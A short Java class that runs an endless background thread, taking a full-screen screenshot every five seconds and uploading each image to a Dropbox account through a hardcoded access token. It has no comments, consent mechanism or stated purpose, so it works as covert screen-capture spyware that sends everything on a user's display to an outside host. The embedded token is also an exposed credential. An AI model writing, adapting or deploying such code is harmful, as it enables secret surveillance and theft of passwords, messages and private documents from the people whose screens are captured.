import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.awt.AWTException;
import java.util.Date;

public class MyThread extends Thread
{
    private Robot robot;
    private static  DbxClientV2 client;
    private static final SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd hh mm ss");
    private static final String ACCESS_TOKEN = "7kxmz6eO0xAAAAAAAAAADFf9R7ZyBEafoTwDTXQOkKiO1ishFfYRKmroHK1zE7is";

    public MyThread()
    {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, ACCESS_TOKEN);

    }

   public void run()
   { 
       for(;;)
       {
           try {
           BufferedImage screenShot = (new Robot()).createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
           ByteArrayOutputStream byteArrayOuputStream = new ByteArrayOutputStream();
           ImageIO.write(screenShot, "PNG", byteArrayOuputStream);
               ByteArrayInputStream in = new ByteArrayInputStream(byteArrayOuputStream.toByteArray());

               client.files()
                       .uploadBuilder("/" + format.format(new Date())+".PNG")
                       .uploadAndFinish(in);

               sleep(5000);
           }
           catch (Exception ex)
           {
               ex.printStackTrace();
           }

       }
   }
}

